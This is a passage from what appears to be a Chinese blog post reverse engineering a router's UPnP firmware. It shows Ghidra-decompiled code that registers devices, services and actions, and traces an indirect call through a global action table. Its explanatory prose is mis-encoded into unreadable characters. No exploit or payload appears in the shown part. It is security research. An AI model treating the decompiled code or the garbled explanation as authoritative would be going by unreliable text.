punctuation">&#123;</span>    iVar1 <span class="token operator">=</span> <span class="token function">ATP_UPnP_RegDevice</span><span class="token punctuation">(</span>local_128<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">"WANDevice:1"</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>local_110<span class="token punctuation">)</span><span class="token punctuation">;</span>    iVar2 <span class="token operator">=</span> <span class="token function">ATP_UPnP_RegService</span><span class="token punctuation">(</span>local_110<span class="token punctuation">,</span><span class="token string">"WANCommonInterfaceConfig:1"</span><span class="token punctuation">,</span><span class="token string">"WanCommonIfc1.xml"</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>                                <span class="token operator">&amp;</span>local_10c<span class="token punctuation">)</span><span class="token punctuation">;</span>    iVar3 <span class="token operator">=</span> <span class="token function">ATP_UPnP_RegService</span><span class="token punctuation">(</span>local_110<span class="token punctuation">,</span><span class="token string">"WANDSLInterfaceConfig:1"</span><span class="token punctuation">,</span><span class="token string">"WanDslIfCfg.xml"</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>                                <span class="token operator">&amp;</span>local_114<span class="token punctuation">)</span><span class="token punctuation">;</span>    iVar4 <span class="token operator">=</span> <span class="token function">ATP_UPnP_RegDevice</span><span class="token punctuation">(</span>local_110<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">"WANConnectionDevice:1"</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>local_108<span class="token punctuation">)</span><span class="token punctuation">;</span>    iVar6 <span class="token operator">=</span> <span class="token function">ATP_UPnP_RegService</span><span class="token punctuation">(</span>local_108<span class="token punctuation">,</span><span class="token string">"WANDSLLinkConfig:1"</span><span class="token punctuation">,</span><span class="token string">"WanDslLink.xml"</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>local_f0<span class="token punctuation">)</span><span class="token punctuation">;</span>    iVar7 <span class="token operator">=</span> <span class="token function">ATP_UPnP_RegService</span><span class="token punctuation">(</span>local_108<span class="token punctuation">,</span><span class="token string">"WANIPConnection:1"</span><span class="token punctuation">,</span><span class="token string">"WanIpConn.xml"</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>local_100<span class="token punctuation">)</span><span class="token punctuation">;</span>    iVar8 <span class="token operator">=</span> <span class="token function">ATP_UPnP_RegService</span><span class="token punctuation">(</span>local_108<span class="token punctuation">,</span><span class="token string">"WANPPPConnection:1"</span><span class="token punctuation">,</span><span class="token string">"WanPppConn.xml"</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>local_104<span class="token punctuation">)</span><span class="token punctuation">;</span>    iVar9 <span class="token operator">=</span> <span class="token function">ATP_UPnP_RegDevice</span><span class="token punctuation">(</span>local_128<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">"LANDevice:1"</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>local_fc<span class="token punctuation">)</span><span class="token punctuation">;</span>    iVar10 <span class="token operator">=</span> <span class="token function">ATP_UPnP_RegService</span><span class="token punctuation">(</span>local_fc<span class="token punctuation">,</span><span class="token string">"LANHostConfigManagement:1"</span><span class="token punctuation">,</span><span class="token string">"LanHostCfgMgmt.xml"</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>                                 <span class="token operator">&amp;</span>local_f8<span class="token punctuation">)</span><span class="token punctuation">;</span>    iVar5 <span class="token operator">=</span> <span class="token function">ATP_UPnP_RegService</span><span class="token punctuation">(</span>local_fc<span class="token punctuation">,</span><span class="token string">"WLANConfiguration:1"</span><span class="token punctuation">,</span><span class="token string">"WLANCfg.xml"</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>local_f4<span class="token punctuation">)</span><span class="token punctuation">;</span>    iVar5 <span class="token operator">=</span> iVar2 <span class="token operator">+</span> iVar1 <span class="token operator">+</span> iVar3 <span class="token operator">+</span> iVar4 <span class="token operator">+</span> iVar6 <span class="token operator">+</span> iVar7 <span class="token operator">+</span> iVar8 <span class="token operator">+</span> iVar9 <span class="token operator">+</span> iVar10 <span class="token operator">+</span> iVar5<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>iVar5 <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      local_e8 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_124<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      iVar1 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_124<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_2c <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_f4<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_30 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_f4<span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_34 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_f4<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_38 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_f4<span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_3c <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_f4<span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_40 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_f4<span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_44 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_f4<span class="token punctuation">,</span><span class="token number">0x31</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_48 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_f4<span class="token punctuation">,</span><span class="token number">0x32</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_4c <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_f4<span class="token punctuation">,</span><span class="token number">0x33</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_50 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_f4<span class="token punctuation">,</span><span class="token number">0x34</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_54 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_f4<span class="token punctuation">,</span><span class="token number">0x35</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_58 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_f4<span class="token punctuation">,</span><span class="token number">0x36</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_5c <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_f4<span class="token punctuation">,</span><span class="token number">0x37</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_60 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_f4<span class="token punctuation">,</span><span class="token number">0x38</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_64 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_f4<span class="token punctuation">,</span><span class="token number">0x39</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_68 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_118<span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_6c <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_11c<span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_70 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_11c<span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_74 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_11c<span class="token punctuation">,</span><span class="token number">0xb</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_78 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_11c<span class="token punctuation">,</span><span class="token number">0xc</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_7c <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_f0<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0xd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_80 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_100<span class="token punctuation">,</span><span class="token number">0xe</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_84 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_100<span class="token punctuation">,</span><span class="token number">0xf</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_88 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_100<span class="token punctuation">,</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_8c <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_100<span class="token punctuation">,</span><span class="token number">0x11</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_90 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_100<span class="token punctuation">,</span><span class="token number">0x16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_94 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_104<span class="token punctuation">,</span><span class="token number">0x12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_98 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_104<span class="token punctuation">,</span><span class="token number">0x13</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_9c <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_104<span class="token punctuation">,</span><span class="token number">0x14</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_a0 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_104<span class="token punctuation">,</span><span class="token number">0x15</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_a4 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_104<span class="token punctuation">,</span><span class="token number">0x17</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_a8 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_104<span class="token punctuation">,</span><span class="token number">0x18</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_ac <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_f8<span class="token punctuation">,</span><span class="token number">0x19</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_b0 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_f8<span class="token punctuation">,</span><span class="token number">0x1a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_b4 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_f8<span class="token punctuation">,</span><span class="token number">0x1b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_b8 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_f8<span class="token punctuation">,</span><span class="token number">0x1c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_bc <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_10c<span class="token punctuation">,</span><span class="token number">0x1d</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_c0 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_10c<span class="token punctuation">,</span><span class="token number">0x1e</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_c4 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_104<span class="token punctuation">,</span><span class="token number">0x1f</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_c8 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_104<span class="token punctuation">,</span><span class="token number">0x21</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_cc <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_100<span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_d0 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_100<span class="token punctuation">,</span><span class="token number">0x22</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_d4 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_100<span class="token punctuation">,</span><span class="token number">0x2e</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_d8 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_100<span class="token punctuation">,</span><span class="token number">0x2f</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_dc <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_100<span class="token punctuation">,</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_e0 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_104<span class="token punctuation">,</span><span class="token number">0x29</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_e4 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_104<span class="token punctuation">,</span><span class="token number">0x2a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      iVar2 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_104<span class="token punctuation">,</span><span class="token number">0x2b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      iVar3 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_104<span class="token punctuation">,</span><span class="token number">0x2c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      iVar4 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_104<span class="token punctuation">,</span><span class="token number">0x2d</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      iVar6 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_f0<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0x23</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      iVar7 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_f0<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0x24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      iVar8 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_f0<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0x25</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      iVar9 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_f0<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0x26</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      iVar10 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_f0<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0x27</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      iVar5 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_f0<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0x28</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      iVar5 <span class="token operator">=</span> iVar1 <span class="token operator">+</span> local_e8 <span class="token operator">+</span> local_2c <span class="token operator">+</span> local_30 <span class="token operator">+</span> local_34 <span class="token operator">+</span> local_38 <span class="token operator">+</span> local_3c <span class="token operator">+</span> local_40 <span class="token operator">+</span>              local_44 <span class="token operator">+</span> local_48 <span class="token operator">+</span> local_4c <span class="token operator">+</span> local_50 <span class="token operator">+</span> local_54 <span class="token operator">+</span> local_58 <span class="token operator">+</span> local_5c <span class="token operator">+</span> local_60              <span class="token operator">+</span> local_64 <span class="token operator">+</span> local_68 <span class="token operator">+</span> local_6c <span class="token operator">+</span> local_70 <span class="token operator">+</span> local_74 <span class="token operator">+</span> local_78 <span class="token operator">+</span> local_7c <span class="token operator">+</span>              local_80 <span class="token operator">+</span> local_84 <span class="token operator">+</span> local_88 <span class="token operator">+</span> local_8c <span class="token operator">+</span> local_90 <span class="token operator">+</span> local_94 <span class="token operator">+</span> local_98 <span class="token operator">+</span> local_9c              <span class="token operator">+</span> local_a0 <span class="token operator">+</span> local_a4 <span class="token operator">+</span> local_a8 <span class="token operator">+</span> local_ac <span class="token operator">+</span> local_b0 <span class="token operator">+</span> local_b4 <span class="token operator">+</span> local_b8 <span class="token operator">+</span>              local_bc <span class="token operator">+</span> local_c0 <span class="token operator">+</span> local_c4 <span class="token operator">+</span> local_c8 <span class="token operator">+</span> local_cc <span class="token operator">+</span> local_d0 <span class="token operator">+</span> local_d4 <span class="token operator">+</span> local_d8              <span class="token operator">+</span> local_dc <span class="token operator">+</span> local_e0 <span class="token operator">+</span> local_e4 <span class="token operator">+</span> iVar2 <span class="token operator">+</span> iVar3 <span class="token operator">+</span> iVar4 <span class="token operator">+</span> iVar6 <span class="token operator">+</span> iVar7 <span class="token operator">+</span> iVar8 <span class="token operator">+</span>              iVar9 <span class="token operator">+</span> iVar10 <span class="token operator">+</span> iVar5<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> iVar5<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>å‡½æ•°è¾ƒé•¿ï¼Œå¯ä»¥ä¸ç”¨æ¯ä¸€è¡Œéƒ½æ˜ç™½ï¼Œå¤§è‡´çœ‹æ‡‚äº†è¯¥å‡½æ•°çš„æ„æ€æ˜¯ï¼Œå¯¹äºéœ€è¦é€šä¿¡çš„è®¾å¤‡å’ŒæœåŠ¡ï¼Œè¿›è¡Œå„è‡ªçš„æ“ä½œï¼Œè·Ÿè¿›Actionå‡½æ•°ï¼ŒæŸ¥çœ‹ä¸€ä¸‹åç»­æ“ä½œã€‚</p><p>åœ¨åç»­çš„æ“ä½œä¸­ï¼Œä¸éš¾å‘ç°è¯¥å‡½æ•°å­˜åœ¨ä¸€ä¸ªæ˜æ˜¾çš„é—´æ¥å‡½æ•°è°ƒç”¨ã€‚</p><figure><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c">undefined4 <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span><span class="token keyword">int</span> param_1<span class="token punctuation">,</span><span class="token keyword">char</span> <span class="token operator">*</span>param_2<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> iVar1<span class="token punctuation">;</span>  <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>ppcVar2<span class="token punctuation">;</span>  <span class="token keyword">char</span> <span class="token operator">*</span>__s1<span class="token punctuation">;</span>  <span class="token keyword">char</span> <span class="token operator">*</span>__s2<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>param_1 <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>param_1 <span class="token operator">+</span> <span class="token number">0x30</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    ppcVar2 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>param_1 <span class="token operator">+</span> <span class="token number">0x24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>ppcVar2 <span class="token operator">!=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      __s2 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>g_astActionArray <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>param_2 <span class="token operator">*</span> <span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">do</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>uint<span class="token punctuation">)</span>ppcVar2<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0x40000000</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          __s1 <span class="token operator">=</span> <span class="token operator">*</span>ppcVar2<span class="token punctuation">;</span>          iVar1 <span class="token operator">=</span> <span class="token function">strcmp</span><span class="token punctuation">(</span>__s1<span class="token punctuation">,</span>__s2<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>iVar1 <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">ATP_UPNP_Free</span><span class="token punctuation">(</span>__s1<span class="token punctuation">)</span><span class="token punctuation">;</span>            ppcVar2<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>uint<span class="token punctuation">)</span>ppcVar2<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0xbfffffff</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token operator">*</span>ppcVar2 <span class="token operator">=</span> param_2<span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        ppcVar2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span>ppcVar2<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span> <span class="token keyword">while</span> <span class="token punctuation">(</span>ppcVar2 <span class="token operator">!=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> <span class="token number">0x40090000</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>åœ¨å‡½æ•°çš„ç¬¬13è¡Œï¼Œ<code>__s2 = *(char **)(g_astActionArray + (int)param_2 * 0x10);</code><br>æŸ¥çœ‹è¯¥å…¨å±€çš„å‡½æ•°å˜é‡ã€‚ä½†æ˜¯å‘ç°æ²¡æœ‰è¯†åˆ«å‡ºæ¥è¿™é‡Œæ•°æ®çš„ç±»å‹ï¼Œç”±äºä¸å¤ªä¼šæ“ä½œGhidraï¼Œæ‰€ä»¥åˆå›åˆ°äº†IDAï¼Œå®šä½åˆ°è¯¥åŒºåŸŸï¼Œæ‰‹åŠ¨è¯†åˆ«äº†ä¸€ä¸‹ï¼ˆæ‡’å¾—å†™idapythonè„šæœ¬ï¼‰<br><img src="https://i.bmp.ovh/imgs/2022/01/3e9c043151bb8b36.png" alt=""></p><p>å…¨å±€çš„è™šè¡¨ï¼Œä½¿ç”¨0å’Œ1æ¥æ ‡å·ï¼Œå¦‚æœä¸º0åˆ™åç§»8çš„ä½ç½®æ˜¯å‡½æ•°ï¼Œå¦‚æœä¸º1åˆ™åç§»8çš„ä½ç½®æ˜¯å­—ç¬¦ä¸²æ•°æ®ã€‚ä»¥æ­¤æ¥ä½œä¸ºä¸€ä¸ªæ 